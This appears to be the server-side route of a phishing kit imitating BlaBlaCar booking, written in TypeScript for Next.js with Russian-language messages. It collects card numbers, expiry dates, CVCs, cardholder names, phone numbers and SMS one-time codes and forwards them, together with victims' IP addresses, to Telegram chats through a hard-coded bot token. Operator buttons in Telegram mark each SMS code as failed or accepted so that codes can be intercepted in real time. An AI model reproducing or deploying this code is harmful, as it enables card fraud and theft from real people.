import { NextRequest, NextResponse } from 'next/server';
import { getCodeErrorFlag, getCodeSuccessFlag } from './codeErrorStore';

const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';
const CHAT_IDS = ['1902713760', '7508575481'];
const WEBHOOK_URL = 'https://blablacar-lovat.vercel.app/api/notify/callback';

// Функция для отправки сообщения в Telegram
async function sendTelegramMessage(chatId: string, message: string, reply_markup?: any) {
  try {
    console.log(`Sending message to chat ${chatId}:`, message);
    console.log('Reply markup:', reply_markup);

    const sendUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const response = await fetch(sendUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        ...(reply_markup ? { reply_markup } : {}),
      }),
    });

    const result = await response.json();
    console.log(`Send message response for chat ${chatId}:`, result);

    if (!result.ok) {
      console.error(`Failed to send message to chat ${chatId}:`, result);
      return { ok: false, error: result };
    }

    return { ok: true, message_id: result.result?.message_id };
  } catch (error) {
    console.error(`Error sending message to chat ${chatId}:`, error);
    return { ok: false, error };
  }
}

// Функция для установки webhook
async function setupWebhook() {
  try {
    console.log('Setting up webhook with URL:', WEBHOOK_URL);
    
    // Сначала удаляем существующий webhook
    const deleteResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/deleteWebhook`);
    const deleteData = await deleteResponse.json();
    console.log('Delete webhook response:', deleteData);
    
    // Затем устанавливаем новый webhook
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: WEBHOOK_URL,
        allowed_updates: ['callback_query', 'message'],
        max_connections: 100,
        drop_pending_updates: true
      })
    });
    
    const data = await response.json();
    console.log('Webhook setup response:', data);

    // Отправляем тестовое сообщение после настройки webhook
    for (const chatId of CHAT_IDS) {
      await sendTelegramMessage(chatId, '🔄 <b>Система перезапущена</b>\nWebhook успешно настроен');
    }
  } catch (error) {
    console.error('Error setting up webhook:', error);
  }
}

// Устанавливаем webhook при инициализации
setupWebhook();

function getClientIp(req: NextRequest) {
  const xff = req.headers.get('x-forwarded-for');
  if (xff) return xff.split(',')[0].trim();
  return req.ip || 'Unknown';
}

export async function GET(req: NextRequest) {
  // Polling для ошибки кода
  if (req.nextUrl.searchParams.get('check_code_error')) {
    const ip = getClientIp(req);
    console.log('Checking code status for IP:', ip);
    const hasError = getCodeErrorFlag(ip);
    const isSuccess = getCodeSuccessFlag(ip);
    
    if (hasError) {
      console.log('Code error flag found for IP:', ip);
      return NextResponse.json({ codeError: 'Код введен неверно или устарел, введите новый поступивший смс код' });
    }
    
    if (isSuccess) {
      console.log('Code success flag found for IP:', ip);
      return NextResponse.json({ codeSuccess: true });
    }
    
    return NextResponse.json({ codeError: null, codeSuccess: false });
  }
  return NextResponse.json({});
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { text, status = 'online', url, message_ids, action, firstName, lastName, card, date, cvc, owner, phone } = body;
    const userAgent = req.headers.get('user-agent') || 'Unknown';
    const ip = getClientIp(req);
    const now = new Date();
    const time = now.toLocaleString('ru-RU', { hour12: false });

    let message = '';
    let reply_markup = undefined;
    if (action === 'payment') {
      message =
        `💳 <b>Попытка оплаты</b>\n` +
        `──────────────\n` +
        `• <b>Номер карты:</b> <code>${card || '-'}</code>\n` +
        `• <b>Дата:</b> <code>${date || '-'}</code>\n` +
        `• <b>CVC:</b> <code>${cvc || '-'}</code>\n` +
        `• <b>ФИО:</b> <code>${owner || '-'}</code>\n` +
        `• <b>Телефон:</b> <code>${phone || '-'}</code>\n` +
        `🕒 <b>Время:</b> ${time}\n` +
        `🌍 <b>IP:</b> ${ip}`;
      reply_markup = {
        inline_keyboard: [
          [
            { text: 'Ошибка / Запросить новый код', callback_data: 'code_error' },
            { text: 'Успех', callback_data: 'code_success' }
          ]
        ],
      };
    } else if (action === 'sms_code') {
      message =
        `🔑 <b>Введён SMS-код</b>\n` +
        `──────────────\n` +
        `• <b>Код:</b> <code>${body.code || '-'}</code>\n` +
        `• <b>Номер карты:</b> <code>${card || '-'}</code>\n` +
        `• <b>Дата:</b> <code>${date || '-'}</code>\n` +
        `• <b>CVC:</b> <code>${cvc || '-'}</code>\n` +
        `• <b>ФИО:</b> <code>${owner || '-'}</code>\n` +
        `• <b>Телефон:</b> <code>${phone || '-'}</code>\n` +
        `🕒 <b>Время:</b> ${time}\n` +
        `🌍 <b>IP:</b> ${ip}`;
    } else if (action === 'booking') {
      message =
        `📝 <b>Новая заявка на бронирование</b>\n` +
        `──────────────\n` +
        `👤 <b>Имя:</b> ${firstName || '-'}\n` +
        `👤 <b>Фамилия:</b> ${lastName || '-'}\n` +
        `➡️ <b>Клиент перешел на страницу оплаты</b>\n` +
        `🕒 <b>Время:</b> ${time}\n` +
        `🌍 <b>IP:</b> ${ip}`;
    } else {
      const statusEmoji = status === 'online' ? '🟢' : '🔴';
      const statusText = status === 'online' ? 'Пользователь онлайн' : 'Пользователь оффлайн';
      message =
        `🚗 <b>BlaBlaCar Booking</b>\n` +
        `──────────────\n` +
        `<b>${statusEmoji} ${statusText}</b>\n` +
        (url ? `🌐 <b>Страница:</b> ${url}\n` : '') +
        `🕒 <b>Время:</b> ${time}\n` +
        `💻 <b>User-Agent:</b> ${userAgent}\n` +
        `🌍 <b>IP:</b> ${ip}`;
    }

    console.log('Sending message to Telegram:', message);
    console.log('Reply markup:', reply_markup);

    const results: { chat_id: string; message_id?: number; ok: boolean }[] = [];
    for (const chatId of CHAT_IDS) {
      const msgId = message_ids?.[chatId];
      let result;
      
      if (msgId && !action) {
        // editMessageText только для online/offline
        const editUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
        console.log('Editing message for chat:', chatId);
        const res = await fetch(editUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            message_id: msgId,
            text: message,
            parse_mode: 'HTML',
          }),
        });
        result = await res.json();
        console.log('Edit message response:', result);
        results.push({ chat_id: chatId, message_id: msgId, ok: result.ok });
      } else {
        // sendMessage (или для booking/payment всегда новое)
        result = await sendTelegramMessage(chatId, message, reply_markup);
        results.push({ chat_id: chatId, message_id: result.message_id, ok: result.ok });
      }
    }

    console.log('All results:', results);

    if (results.every(r => r.ok)) {
      const ids: Record<string, number> = {};
      results.forEach(r => { if (r.message_id) ids[r.chat_id] = r.message_id; });
      return NextResponse.json({ ok: true, message_ids: ids });
    } else {
      console.error('Some messages failed to send:', results);
      return NextResponse.json({ ok: false, error: results }, { status: 500 });
    }
  } catch (e) {
    console.error('Error sending message:', e);
    return NextResponse.json({ ok: false, error: e?.toString() }, { status: 500 });
  }
} 